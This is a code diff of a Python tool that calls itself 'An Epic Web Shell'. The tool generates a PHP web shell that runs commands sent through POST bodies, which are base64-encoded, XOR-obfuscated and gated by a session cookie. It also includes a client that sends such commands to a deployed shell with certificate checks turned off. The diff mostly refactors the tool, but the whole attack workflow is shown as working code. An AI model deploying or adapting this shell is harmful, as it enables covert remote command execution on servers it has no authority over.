@@ -1,23 +1,15 @@
 #!/usr/bin/env python3
+
 import argparse
-from termcolor import colored
-from base64 import b64encode
-import random
 import bcrypt
-import requests
 import os
+import random
+import requests
 import sys
+import string
 
-def parse_options():
-
-	formatter = lambda prog: argparse.HelpFormatter(prog,max_help_position=50)
-	parser = argparse.ArgumentParser(description='An Epic Web Shell - @cwinfosec', formatter_class=formatter)
-	parser.add_argument("-g", "--generate", dest="generate", help="Generate new key and webshell.", action="store_true", required=False)
-	parser.add_argument("-c", "--connect", dest="connect", type=str, help="URL of web shell to connect to.", required=False)
-	parser.add_argument("-k", "--key", dest="key", type=str, help="Auth key for the generated web shell.", required=False)
-	parser.add_argument("-pk", "--payload-key", dest="pkey", help="Payload key for webshell.", required=False)
-	args = parser.parse_args()
-	return args
+from base64 import b64encode
+from termcolor import colored
 
 def generate_key(seed):
 
@@ -28,7 +20,7 @@ def generate_key(seed):
 def generate_shell(key, gen_pkey):
 
 	shell = ['<?php',
-		'$payload_key = "%s";' % gen_pkey,
+		'$payload_key = \'%s\';' % gen_pkey,
 		'if ($_COOKIE["session"] === "%s") {' % key,
 		'  $payload = file_get_contents("php://input");',
 		'  $command = base64_decode($payload) ^ $payload_key;',
@@ -74,8 +66,15 @@ def connect(url, hmac, payload_key):
 			'Cookie':'session=' + hmac,
 		}
 
-		r = requests.post(url, data=b64encode(xor_function(s1,s2).encode("ascii")), headers=custom_headers, verify=False)
-		print(r.text)
+		try:
+
+			s = requests.Session()
+			r = s.post(url, data=b64encode(xor_function(s1,s2).encode("ascii")), headers=custom_headers, verify=False)
+			print(r.text)
+
+		except(requests.ConnectionError, requests.HTTPError, requests.Timeout) as e:
+
+			print(e)
 
 def xor_function(s1, s2):
 
@@ -83,10 +82,11 @@ def xor_function(s1, s2):
 
 def main(args):
 
+	special_chars = '!@#%^&*()-=_+[]{}";:,./<>?'
+	charset = string.ascii_uppercase + string.ascii_lowercase + string.digits + special_chars
 
-	chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01234567890!@#$%^&*()-=_+[]{};":,./<>?'
-	seed = ''.join(random.choice(chars) for i in range(50))
-	gen_pkey = ''.join(random.choice(chars) for i in range(8))
+	seed = ''.join(random.choices(charset, k=50))
+	gen_pkey = ''.join(random.choices(charset, k=8))
 
 	if args.connect:
 
@@ -106,5 +106,11 @@ def main(args):
 
 if __name__ in "__main__":
 
-	args = parse_options()
+	formatter = lambda prog: argparse.HelpFormatter(prog,max_help_position=50)
+	parser = argparse.ArgumentParser(description='An Epic Web Shell - @cwinfosec', formatter_class=formatter)
+	parser.add_argument("-g", "--generate", dest="generate", help="Generate new key and webshell.", action="store_true", required=False)
+	parser.add_argument("-c", "--connect", dest="connect", type=str, help="URL of web shell to connect to.", required=False)
+	parser.add_argument("-k", "--key", dest="key", type=str, help="Auth key for the generated web shell.", required=False)
+	parser.add_argument("-pk", "--payload-key", dest="pkey", help="Payload key for webshell.", required=False)
+	args = parser.parse_args()
 	main(args)
